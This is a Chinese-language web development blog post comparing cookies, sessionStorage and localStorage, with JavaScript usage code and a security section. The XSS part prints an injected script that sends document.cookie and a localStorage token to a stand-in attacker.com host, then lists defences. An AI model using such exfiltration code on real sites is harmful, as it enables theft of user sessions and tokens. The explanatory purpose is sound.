---
title: cookie, sessionStorage 和 localStorage 差異
description: 工作時要追求效率，但學習不是
authors: [clove]
tags: [internet]
---

## 這些是什麼？

在瀏覽器中，我們有三種主要的客戶端儲存方式來保存使用者資料：

### Cookie
Cookie 是伺服器發送到瀏覽器並儲存在本地的一小段資料。當瀏覽器再次向同一伺服器發出請求時，它會自動將 Cookie 一起發送。主要用於：
- 會話管理（Session Management）：如登入狀態、購物車
- 個人化設定：使用者偏好、主題
- 追蹤與分析：使用者行為記錄

### sessionStorage
sessionStorage 是 HTML5 提供的瀏覽器本地儲存 API，資料僅在當前瀏覽器分頁或視窗中有效。適合用於：
- 單次會話的臨時資料
- 表單填寫的暫存
- 單頁應用（SPA）中的臨時狀態

### localStorage
localStorage 同樣是 HTML5 的本地儲存 API，但資料會永久保存（除非主動刪除）。常用於：
- 長期保存的使用者設定
- 離線應用的資料快取
- 不需要傳送到伺服器的大量資料

## 三種儲存方式的差異在哪？

| 特性 | Cookie | sessionStorage | localStorage |
|------|--------|----------------|--------------|
| **儲存容量** | 約 4KB | 約 5-10MB | 約 5-10MB |
| **生命週期** | 可設定過期時間，預設為瀏覽器關閉後刪除 | 分頁或瀏覽器關閉後刪除 | 永久保存，除非手動清除 |
| **與伺服器通訊** | 每次 HTTP 請求都會自動帶上 | 不會自動發送到伺服器 | 不會自動發送到伺服器 |
| **作用域** | 可設定 domain 和 path，跨分頁共享 | 僅限當前分頁 | 同源（protocol + domain + port）共享 |
| **API 易用性** | 需要手動解析字串 | 簡單的 key-value API | 簡單的 key-value API |
| **安全性** | 可設定 HttpOnly、Secure 等屬性 | 只能由 JavaScript 存取 | 只能由 JavaScript 存取 |
| **瀏覽器支援** | 所有瀏覽器 | IE8+ 及現代瀏覽器 | IE8+ 及現代瀏覽器 |
| **適用場景** | 身份驗證、跨頁面狀態、需要伺服器存取的資料 | 表單暫存、單頁應用的臨時狀態 | 使用者偏好設定、離線資料、長期狀態 |

## 實務上怎麼讀取寫入？

### Cookie 操作

**寫入 Cookie**
```javascript
// 基本寫入
document.cookie = "username=John";

// 設定過期時間
document.cookie = "username=John; expires=Fri, 31 Dec 2024 23:59:59 GMT";

// 設定路徑和網域
document.cookie = "username=John; path=/; domain=example.com";

// 設定安全屬性
document.cookie = "token=abc123; Secure; HttpOnly; SameSite=Strict";
```

**讀取 Cookie**
```javascript
// 取得所有 cookies（返回字串）
const cookies = document.cookie;
// 輸出：username=John; token=abc123

// 解析特定 cookie 的輔助函式
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}

const username = getCookie('username');
```

**刪除 Cookie**
```javascript
// 設定過期時間為過去
document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
```

### sessionStorage 操作

```javascript
// 寫入資料
sessionStorage.setItem('key', 'value');
sessionStorage.setItem('user', JSON.stringify({ name: 'John', age: 30 }));

// 讀取資料
const value = sessionStorage.getItem('key');
const user = JSON.parse(sessionStorage.getItem('user'));

// 刪除特定資料
sessionStorage.removeItem('key');

// 清空所有資料
sessionStorage.clear();

// 取得鍵名
const firstKey = sessionStorage.key(0);

// 取得項目數量
const count = sessionStorage.length;
```

### localStorage 操作

```javascript
// 寫入資料
localStorage.setItem('theme', 'dark');
localStorage.setItem('settings', JSON.stringify({ lang: 'zh-TW', fontSize: 16 }));

// 讀取資料
const theme = localStorage.getItem('theme');
const settings = JSON.parse(localStorage.getItem('settings'));

// 刪除特定資料
localStorage.removeItem('theme');

// 清空所有資料
localStorage.clear();

// 監聽 storage 變化（僅限跨分頁）
window.addEventListener('storage', (e) => {
  console.log('Key:', e.key);
  console.log('Old Value:', e.oldValue);
  console.log('New Value:', e.newValue);
  console.log('URL:', e.url);
});
```

### 實用技巧

**封裝 Cookie 工具**
```javascript
const CookieUtil = {
  set(name, value, days, path = '/') {
    let expires = '';
    if (days) {
      const date = new Date();
      date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
      expires = `; expires=${date.toUTCString()}`;
    }
    document.cookie = `${name}=${value}${expires}; path=${path}`;
  },
  
  get(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
  },
  
  remove(name, path = '/') {
    document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=${path}`;
  }
};
```

**Storage 封裝（支援過期時間）**
```javascript
const StorageUtil = {
  set(key, value, expireMinutes = null) {
    const item = {
      value: value,
      expire: expireMinutes ? Date.now() + expireMinutes * 60 * 1000 : null
    };
    localStorage.setItem(key, JSON.stringify(item));
  },
  
  get(key) {
    const itemStr = localStorage.getItem(key);
    if (!itemStr) return null;
    
    const item = JSON.parse(itemStr);
    
    // 檢查是否過期
    if (item.expire && Date.now() > item.expire) {
      localStorage.removeItem(key);
      return null;
    }
    
    return item.value;
  },
  
  remove(key) {
    localStorage.removeItem(key);
  }
};
```

## 安全性問題

### 1. XSS (Cross-Site Scripting) 攻擊

**風險**
- 攻擊者注入惡意 JavaScript 程式碼
- 可以讀取 Cookie、localStorage、sessionStorage
- 竊取使用者的敏感資料或 Session Token

**範例**
```javascript
// 攻擊者注入的惡意程式碼
<script>
  // 竊取 Cookie
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
  
  // 竊取 localStorage
  fetch('https://attacker.com/steal?data=' + localStorage.getItem('token'));
</script>
```

**防禦措施**
- 對使用者輸入進行過濾和轉義
- 使用 Content Security Policy (CSP)
- Cookie 設定 `HttpOnly` 屬性（無法被 JavaScript 讀取）
- 敏感資料不要存在 localStorage 或 sessionStorage

### 2. CSRF (Cross-Site Request Forgery) 攻擊

**風險**
- 利用使用者的登入狀態發送惡意請求
- Cookie 會自動帶上，導致請求被認為是合法的

**防禦措施**
- 使用 CSRF Token
- Cookie 設定 `SameSite` 屬性
- 驗證 `Referer` 或 `Origin` Header
- 重要操作需要二次驗證

### 3. 中間人攻擊 (Man-in-the-Middle)

**風險**
- 在不安全的網路環境下，資料可能被攔截
- Cookie 和其他資料可能被竊取或篡改

**防禦措施**
- 使用 HTTPS
- Cookie 設定 `Secure` 屬性（只在 HTTPS 下傳送）
- 實施 HSTS (HTTP Strict Transport Security)

### 4. 資料外洩風險

**localStorage/sessionStorage 的風險**
- 任何在頁面上執行的 JavaScript 都可以讀取
- 第三方套件可能存在安全漏洞
- 瀏覽器擴充套件可以存取

**建議**
- 不要儲存敏感資料（密碼、信用卡號等）
- 敏感的 Token 盡量使用 HttpOnly Cookie
- 定期清理過期資料

:::info

延伸閱讀：[如何增加 cookie 的安全性](cookie-secure)
:::
